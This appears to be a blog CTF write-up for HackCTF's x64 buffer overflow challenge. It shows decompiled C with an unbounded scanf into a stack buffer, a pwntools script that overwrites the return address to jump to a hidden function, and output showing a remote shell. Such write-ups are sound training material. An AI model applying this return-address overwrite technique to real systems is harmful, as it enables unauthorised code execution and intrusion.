---
layout: post
title: "HackCTF x64 Buffer Overflow"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# x64 Buffer Overflow

## Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[268]; // [rsp+10h] [rbp-110h]
  int v5; // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", s, envp);
  v5 = strlen(s);
  printf("Hello %s\n", s);
  return 0;
}
```

## Solve

```python
from pwn import *

#context.log_level = 'DEBUG'

e = ELF("./64bof_basic")
#p = process("./64bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3004)
offset = 280
pr_rdi = 0x400713
callMeMaybe = 0x400606

payload = ''
payload += "A"*offset
payload += p64(callMeMaybe)
payload += p64(pr_rdi)

r.sendline(payload)
r.interactive()
```

```bash
➜  hackctf python 64bof_basic.py
[*] '/home/ubuntu/ctf/hackctf/64bof_basic'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done
[*] Switching to interactive mode
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```